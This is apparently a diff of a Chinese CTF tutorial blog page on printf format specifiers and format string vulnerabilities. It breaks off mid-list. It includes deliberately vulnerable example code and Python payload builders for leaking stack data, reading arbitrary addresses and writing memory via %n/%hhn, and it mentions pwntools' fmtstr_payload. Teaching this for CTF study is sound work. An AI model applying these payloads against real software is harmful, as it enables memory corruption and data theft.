class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">signed</span> <span class="type">char</span> a = <span class="number">-5</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%hhd\n&quot;</span>, a);</span><br><span class="line">    <span class="comment">// 会输出 &quot;-5&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">short</span> s = <span class="number">32000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%hd\n&quot;</span>, s);</span><br><span class="line">    <span class="comment">// 会输出 &quot;32000&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> l = <span class="number">123456789L</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%ld\n&quot;</span>, l);</span><br><span class="line">    <span class="comment">// 会输出 &quot;123456789&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> ll = <span class="number">9223372036854775807LL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, ll);</span><br><span class="line">    <span class="comment">// 会输出 &quot;9223372036854775807&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> <span class="type">double</span> ld = <span class="number">3.141592653589793238L</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%Lf\n&quot;</span>, ld);</span><br><span class="line">    <span class="comment">// 会输出 &quot;3.141593&quot;（默认保留6位小数）</span></span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> sz = <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%zu\n&quot;</span>, sz);</span><br><span class="line">    <span class="comment">// 会输出 &quot;100&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">ptrdiff_t</span> diff = <span class="number">-8</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%td\n&quot;</span>, diff);</span><br><span class="line">    <span class="comment">// 会输出 &quot;-8&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">intmax_t</span> im = <span class="number">9223372036854775807</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%jd\n&quot;</span>, im);</span><br><span class="line">    <span class="comment">// 会输出 &quot;9223372036854775807&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>- <strong>Type</strong>：也称转换说明（conversion specification/specifier），指定具体的数据类型，有以下选择</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th style="text-align:center">字符</th>
+<th style="text-align:center">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"><code>%p</code></td>
+<td style="text-align:center">打印指针（十六进制地址）</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>%x</code></td>
+<td style="text-align:center">打印十六进制（小写）</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>%s</code></td>
+<td style="text-align:center">打印字符串（char*），即打印某个地址里的内容。</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>%.2f</code></td>
+<td style="text-align:center">打印浮点数，保留小数点后2位</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>%f</code></td>
+<td style="text-align:center">打印浮点数（float/double）</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>%c</code></td>
+<td style="text-align:center">打印单个字符（char）</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>%d</code></td>
+<td style="text-align:center">打印十进制整数（int）</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>%%</code></td>
+<td style="text-align:center">输出一个百分号 %</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>其中只有Type是必须要给的，其他均可以省略。</p>
+<p>例子：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">123</span>;</span><br><span class="line">    <span class="type">float</span> pi = <span class="number">3.14159</span>;</span><br><span class="line">    <span class="type">char</span> letter = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">    <span class="type">char</span> name[] = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    <span class="type">int</span> hex = <span class="number">255</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;整数：%d\n&quot;</span>, i);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;浮点数（默认）：%f\n&quot;</span>, pi);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;浮点数（保留两位）：%.2f\n&quot;</span>, pi);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;字符串：%s\n&quot;</span>, name);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;字符：%c\n&quot;</span>, letter);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;十六进制：%x\n&quot;</span>, hex);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;百分号：%%\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>注意：在第二部分一定要给定变量，如果没有给，则会从错误的内存地址读取数据，导致不可预期的行为。</p>
+<p>此外还有一个比较特殊的格式符：<code>%n</code> 。这个格式符会让 <code>printf</code> 把当前已经打印的字符数量写入n。（或者说写入给定的地址。）</p>
+<p>比如说下面这个例子（正常用法）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;hello%n&quot;</span>, &amp;n);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>n的值会被存储为5。</p>
+<p>由于它的特殊性以及危险性，很多现代系统在libc中禁用了 <code>%n</code>，或者在格式化函数上增加了保护（如glibc中对 <code>%n</code> 的格式检查）。</p>
+<p>不过正是因为它的危险性所以我们在pwn里经常会用它来修改内存数据</p>
+<h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a><strong>变量</strong></h4><p>希望输出的变量。</p>
+<h3 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a><strong>格式化字符串漏洞</strong></h3><p><strong>正常情况</strong>：<br>在进入<code>printf</code>函数之后，函数会首先获取第一个参数，一个一个读取其字符会遇到两种情况</p>
 <ul>
 <li>当前字符不是<code>%</code>，直接输出到相应标准输出。</li>
 <li>当前字符是<code>%</code>， 继续读取下一个字符<ul>
-<li>如果没有字符，报错；</li>
-<li>如果下一个字符是<code>%</code>, 输出<code>%；</code></li>
-<li>否则根据相应的字符，获取相应的参数，对其进行解析并输出。</li>
+<li>如果没有字符，报错</li>
+<li>如果下一个字符是<code>%</code>, 输出<code>%</code></li>
+<li>否则根据相应的字符，获取相应的参数，对其进行解析并输出</li>
 </ul>
 </li>
 </ul>
 <p>例子：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="type">float</span> b = <span class="number">3.14</span>;</span><br><span class="line">    <span class="type">char</span> *str = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Int: %d, Float: %f, String: %s\n&quot;</span>, a, b, str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>栈的大概结构：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+----------------------+</span><br><span class="line">| 返回地址（printf结束后跳转） |</span><br><span class="line">+----------------------+</span><br><span class="line">| 格式字符串地址       | --&gt; &quot;Int: %d, Float: %f, String: %s\n&quot;</span><br><span class="line">+----------------------+</span><br><span class="line">| 参数3（str）         | --&gt; 指向 &quot;hello&quot;</span><br><span class="line">+----------------------+</span><br><span class="line">| 参数2（b）           | --&gt; float/double 值：3.14</span><br><span class="line">+----------------------+</span><br><span class="line">| 参数1（a）           | --&gt; 整数值：10</span><br><span class="line">+----------------------+</span><br></pre></td></tr></table></figure>
-<p>函数会从栈里正常读取指定的变量的值。</p>
-<p>而当我们在使用格式化字符串函数但是<strong>并没有给定具体变量</strong>的情况下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="type">float</span> b = <span class="number">3.14f</span>;   <span class="comment">// 注意：传入变参会被“默认实参提升”为 double</span></span><br><span class="line">    <span class="type">char</span> *str = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Int: %d, Float: %f, String: %s\n&quot;</span>, a, b, str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="参数是怎么传进-printf-的（32-bit-和-64-bit）"><a href="#参数是怎么传进-printf-的（32-bit-和-64-bit）" class="headerlink" title="参数是怎么传进 printf 的（32-bit 和 64-bit）"></a><strong>参数是怎么传进 <code>printf</code> 的（32-bit 和 64-bit）</strong></h4><h5 id="32-bit（cdecl）——全部走栈"><a href="#32-bit（cdecl）——全部走栈" class="headerlink" title="32-bit（cdecl）——全部走栈"></a><strong>32-bit（cdecl）——全部走栈</strong></h5><ul>
+<li>变参有“<strong>默认实参提升（default argument promotions）</strong>”：<code>float</code> 会提升为 <code>double</code>（占 8 字节），<code>char/short</code> 提升为 <code>int</code>。</li>
+<li>典型调用时<strong>栈</strong>的示意（自上而下是低地址 → 高地址，或按“调用现场从下往上”理解也可以）：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+------------------------------+</span><br><span class="line">| 返回地址（printf 结束后跳转）  |</span><br><span class="line">+------------------------------+</span><br><span class="line">| 格式字符串地址                | --&gt; &quot;Int: %d, Float: %f, String: %s\n&quot;</span><br><span class="line">+------------------------------+</span><br><span class="line">| 参数3（str，4B）              | --&gt; 指向 &quot;hello&quot;</span><br><span class="line">+------------------------------+</span><br><span class="line">| 参数2（b，double，8B）        | --&gt; 3.14（已提升）</span><br><span class="line">+------------------------------+</span><br><span class="line">| 参数1（a，4B）                | --&gt; 10</span><br><span class="line">+------------------------------+</span><br></pre></td></tr></table></figure>
+<p><code>printf</code> 在解析到 <code>%d/%f/%s</code> 时，会从“第一个可变参数槽位”开始，依次取“4B/8B/指针”的值并格式化输出。</p>
+<h5 id="x86-64（System-V-ABI）——寄存器优先-溢出到栈"><a href="#x86-64（System-V-ABI）——寄存器优先-溢出到栈" class="headerlink" title="x86-64（System V ABI）——寄存器优先 + 溢出到栈"></a><strong>x86-64（System V ABI）——寄存器优先 + 溢出到栈</strong></h5><ul>
+<li>前 6 个<strong>整数/指针类</strong>参数：<code>RDI, RSI, RDX, RCX, R8, R9</code></li>
+<li>前 8 个<strong>浮点类</strong>参数：<code>XMM0–XMM7</code>（<code>float</code> 仍提升为 <code>double</code>）</li>
+<li><strong>变参函数</strong>还会准备一个<strong>寄存器保存区（register save area）</strong>和<strong>栈溢出区（overflow area）</strong>。<code>va_list/va_arg</code> 会按<strong>参数类型</strong>从对应区域<strong>顺序取值</strong>；寄存器名额用完后改从栈上取。</li>
+</ul>
+<p>对应上面的例子，调用瞬间常见分配为：</p>
+<ul>
+<li><code>RDI</code> = <code>&quot;Int: %d, Float: %f, String: %s\n&quot;</code>（格式串）</li>
+<li><code>RSI</code> = <code>a</code>（<code>%d</code>）</li>
+<li><code>XMM0</code> = <code>b</code> 的 double（<code>%f</code>）</li>
+<li><code>RDX</code> = <code>str</code>（<code>%s</code>）</li>
+</ul>
+<p>在64-bit架构下不是所有参数都在栈上。<code>printf</code> 通过 <code>va_list</code> 维护“当前吃到第几个槽位”，按类型<strong>先从寄存器保存区拿，超出再从栈拿</strong>；这就是为什么64-bit 下偏移（offset）和 32-bit 不同，必须现场探测或用 <code>%n$</code> 显式参数序号。</p>
+<h4 id="特殊情况以及偏差值"><a href="#特殊情况以及偏差值" class="headerlink" title="特殊情况以及偏差值"></a><strong>特殊情况以及偏差值</strong></h4><p>当我们在使用格式化字符串函数但<strong>未提供后续实参</strong>（即只给了 <code>fmt</code> 一个参数）时：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello %x %x %x %x&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>则会<strong>从栈中依次读取未定义的值</strong>作为参数进行格式化输出。</p>
-<p>在CTF的题目里这个漏洞一般的表现如下：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> user_input[<span class="number">100</span>];</span><br><span class="line">    gets(user_input); </span><br><span class="line">    <span class="built_in">printf</span>(user_input);  <span class="comment">// 会将我们的输入直接当成格式字符串并处理</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>printf</code> 在扫描到每个转换说明（<code>%...</code>）时，会依据 ABI 约定通过 <code>va_arg</code> <strong>按顺序</strong>从<strong>可变参数起始位置</strong>检索下一参数槽位的内容：在 <strong>x86（32-bit）</strong> 上对应为<strong>栈槽</strong>，在 <strong>x86-64 SysV</strong> 上对应为<strong>寄存器保存区（reg_save_area）</strong>以及<strong>栈溢出区（overflow_arg_area）</strong>。</p>
+<p>由于这些槽位<strong>未被显式赋值</strong>，读取到的将是相应存储区域中的现存（残存）/未定义数据，于是被按 <code>%x/%p/%s</code> 等格式解释并输出。进一步地，当该顺序读取过程推进到<strong>包含本次输入缓冲区</strong>（例如位于栈、堆或 <code>.bss</code>）的地址范围，且<strong>首次</strong>取到我们预置的标记（如 <code>AAAA...</code>）时，<strong>该标记对应的参数序号</strong>就称为<strong>偏差值 <code>k</code></strong>（即从“第一个可变参数槽位”开始计数，到首次命中标记之间的槽位数量）。这样一来，我们即可使用显式参数序号（如 <code>%k$p</code>, <code>%k$s</code>, <code>%k$n</code>）<strong>稳定地指向</strong>目标槽位进行泄露或写入。</p>
+<h4 id="漏洞表现"><a href="#漏洞表现" class="headerlink" title="漏洞表现"></a><strong>漏洞表现</strong></h4><p>在CTF的题目里这个漏洞一般的表现如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    fgets(buf, <span class="keyword">sizeof</span>(buf), <span class="built_in">stdin</span>); </span><br><span class="line">    <span class="built_in">printf</span>(buf);  <span class="comment">// 会将我们的输入直接当成格式字符串并处理</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>我们可以利用这个漏洞读取栈上的内容（如变量值、返回地址等）或者通过 <code>%n</code> 格式符（就是我们之前提到的那个危险的格式符）向指定内存地址写入数据。</p>
-<h2 id="堆利用-Heap-Exploitation"><a href="#堆利用-Heap-Exploitation" class="headerlink" title="堆利用/Heap Exploitation"></a><strong>堆利用/Heap Exploitation</strong></h2><h2 id="题目分类"><a href="#题目分类" class="headerlink" title="题目分类"></a><strong>题目分类</strong></h2><ol>
+<h3 id="Exploit技巧"><a href="#Exploit技巧" class="headerlink" title="Exploit技巧"></a><strong>Exploit技巧</strong></h3><h4 id="读取栈上的内容"><a href="#读取栈上的内容" class="headerlink" title="读取栈上的内容"></a><strong>读取栈上的内容</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x %x %x&quot;</span>);</span><br><span class="line"><span class="comment">// bffff5c4 80484f0 1</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p %p %p&quot;</span>);</span><br><span class="line"><span class="comment">// 0xbffff5c4 0x80484f0 0x1</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>%x</code> ：以<strong>十六进制整数形式</strong>输出栈上的内容。</li>
+<li><code>%p</code> ：以<strong>指针形式</strong>（十六进制地址）输出栈上的内容。</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;%p &quot;</span> * <span class="number">40</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;%x &quot;</span> * <span class="number">40</span></span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20251110100216475.png" class="lazyload" data-srcset="/images/image-20251110100216475.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20251110100216475"></p>
+<p>或者也可以使用<code>%n$p</code>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;%1$p %2$p %3$p %4$p %5$p %6$p %7$p %8$p %9$p %10$p&quot;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot; &quot;</span>.join([<span class="string">f&quot;%<span class="subst">&#123;i&#125;</span>$p&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">61</span>)]).encode()</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20251110100300562.png" class="lazyload" data-srcset="/images/image-20251110100300562.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20251110100300562"></p>
+<h4 id="读取任意地址的字符串"><a href="#读取任意地址的字符串" class="headerlink" title="读取任意地址的字符串"></a><strong>读取任意地址的字符串</strong></h4><ul>
+<li><code>%s</code>：把 <strong>栈上的值当成一个指针地址</strong>，并尝试打印这个地址指向的内存，直到遇到 <code>\0</code>。</li>
+</ul>
+<p>假设栈上某个参数的值是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x08049000   →   指向 &quot;HelloWorld&quot;</span><br></pre></td></tr></table></figure>
+<p>用 <code>%x</code>和<code>%p</code>会输出</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">8049000</span><br><span class="line">0x8049000</span><br></pre></td></tr></table></figure>
+<p>用<code>%s</code>则会输出</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>);</span><br><span class="line">HelloWorld</span><br></pre></td></tr></table></figure>
+<h5 id="一般流程"><a href="#一般流程" class="headerlink" title="一般流程"></a><strong>一般流程</strong></h5><ol>
+<li><p><strong>确定偏移<code>S</code>（offset）</strong>：</p>
+<p>输入形如 <code>AAAA,%p,%p,%p...</code> 看第几个 <code>%p</code> 能读出我们可控的标记（比如 <code>0x41414141</code>），得到偏移 <code>S</code>。</p>
+</li>
+<li><p><strong>使用下面的方法构造payload</strong></p>
+</li>
+</ol>
+<p>假如我们确定了偏移，并且知道了flag的具体地址，那么我们便可以用以下的payload直接读取flag的内容：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fmt_read_addr_payload</span>(<span class="params">offset, addr, k=<span class="number">1</span></span>):</span><br><span class="line">    fmt = <span class="string">f&quot;%<span class="subst">&#123;offset + k&#125;</span>$s&quot;</span>.encode()</span><br><span class="line">    <span class="keyword">return</span> fmt + <span class="string">b&quot;A&quot;</span>*(<span class="number">8</span> * k - <span class="built_in">len</span>(fmt)) + p64(addr)</span><br></pre></td></tr></table></figure>
+<p>其中：</p>
+<ul>
+<li><p>offset是我们确定的偏移</p>
+</li>
+<li><p>addr是我们希望读取的内容的地址</p>
+</li>
+<li><p>8*k主要用于对齐。（如果k=1不行，可以尝试k=4，貌似比较稳。）</p>
+<p>因为<code>p64(addr)</code> 直接接在格式串后面，如果没有按8字节对齐，它大概率不会正好落在第offset个槽位上，也就会导致读取出问题。</p>
+</li>
+</ul>
+<h4 id="写入"><a href="#写入" class="headerlink" title="写入"></a><strong>写入</strong></h4><h5 id="一般流程-1"><a href="#一般流程-1" class="headerlink" title="一般流程"></a><strong>一般流程</strong></h5><ol>
+<li><p><strong>确定偏移 <code>S</code>（offset）</strong>：<br>输入形如 <code>AAAA,%p,%p,%p...</code> 看第几个 <code>%p</code> 能读出我们可控的标记（比如 <code>0x41414141</code>），得到偏移 <code>S</code>。</p>
+</li>
+<li><p><strong>放置目标地址</strong>（避免<code>\x00</code>截断）：</p>
+<ul>
+<li>把“<strong>格式化指令（全 ASCII）</strong>”放在前面；</li>
+<li>把<strong>目标地址（或一串地址）</strong>放在 payload <strong>末尾</strong>；</li>
+<li>用<strong>位置参数</strong><code>%K$...</code> 来点名这些地址（<code>K</code> 从 <code>S + ceil(len(fmt_ascii)/8)</code> 起）。</li>
+</ul>
+</li>
+<li><p><strong>对齐/padding</strong>：</p>
+<ul>
+<li><p><code>written</code> = 到当前为止<strong>已输出字符数</strong>；</p>
+</li>
+<li><p>目标值 <code>want</code>（<strong>希望被写入</strong>到内存里的数值，按写入宽度取模）；</p>
+</li>
+<li><p>计算：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">base = <span class="number">256</span>      <span class="comment">#（%hhn，1字节）</span></span><br><span class="line">base = <span class="number">65536</span>    <span class="comment">#（%hn，2字节）</span></span><br><span class="line">base = <span class="number">2</span>**<span class="number">32</span>    <span class="comment">#（%n，4字节）</span></span><br><span class="line">base = <span class="number">2</span>**<span class="number">64</span>    <span class="comment">#（%ln/%lln，8字节）</span></span><br><span class="line"></span><br><span class="line">pad  = (want - (written % base)) % base</span><br><span class="line"><span class="comment"># 如果 pad == 0，为了稳妥可用 pad = base（等价“加 0”）</span></span><br></pre></td></tr></table></figure>
+<p>base为取值范围，分别等于1，2，4，8字节的最大值。</p>
+</li>
+<li><p>然后输出 <code>%padc</code>（或其他等价方式）把 <code>written</code> 调到想要的值。</p>
+</li>
+</ul>
+</li>
+<li><p><strong>执行写入</strong>：</p>
+<ul>
+<li><code>%K$hhn</code>  写 1 字节</li>
+<li><code>%K$hn</code>   写 2 字节</li>
+<li><code>%K$n</code>    写 4 字节（<code>int*</code>）</li>
+<li><code>%K$ln</code>/<code>%K$lln</code> 写 8 字节（<code>long*</code>/<code>long long*</code>，在 x86_64 都是 8Byte）</li>
+</ul>
+</li>
+</ol>
+<p>对 <code>%hn/%n/%ln</code> 这类多字节写，<strong>最好按“从小到大”的目标值</strong>排序写入，避免 padding 需要“回绕”到很大的数。或者直接用<strong>逐字节写</strong> <code>%hhn</code>。</p>
+<h5 id="写-1-字节（-hhn）"><a href="#写-1-字节（-hhn）" class="headerlink" title="写 1 字节（%hhn）"></a><strong>写 1 字节（<code>%hhn</code>）</strong></h5><p>示例 1：把 <code>pwnme_addr</code> 的<strong>最低 1 字节</strong>写成 <code>0x90</code></p>
+<p>假设已经测得偏移 <code>S = 10</code>，并用<br> <code>BASE = S + ceil(len(fmt_ascii)/8)</code> 计算出第一个地址是第 <code>K=BASE</code> 个参数位。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 目标：*(uint8_t*)pwnme_addr = 0x90</span></span><br><span class="line"><span class="comment"># 只需让 written % 256 == 0x90 (=144)</span></span><br><span class="line">payload =</span><br><span class="line"><span class="string">b&quot;%144c&quot;</span>      <span class="comment"># written += 144</span></span><br><span class="line"><span class="string">b&quot;%K$hhn&quot;</span>     <span class="comment"># 把 (written%256)=0x90 写进第 K 个参数指向的地址</span></span><br><span class="line">+ p32(pwnme_addr);</span><br></pre></td></tr></table></figure>
+<p>若此时 <code>written % 256</code> 不是从 0 开始，照公式算：<br><code>pad = (0x90 - (written%256)) % 256</code>，用 <code>%padc</code> 形成 padding。</p>
+<h5 id="fmtstr-payload"><a href="#fmtstr-payload" class="headerlink" title="fmtstr_payload"></a><strong>fmtstr_payload</strong></h5><p>Pwntools里有现成的高效构造这种payload的函数：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fmtstr_payload(offset, writes, numbwritten=<span class="number">0</span>, write_size=<span class="string">&#x27;byte&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>（官方文档：<a target="_blank" rel="noopener" href="https://docs.pwntools.com/en/dev/fmtstr.html">https://docs.pwntools.com/en/dev/fmtstr.html</a> ）</p>
+<p><strong>参数（摘译）</strong>：</p>
+<ul>
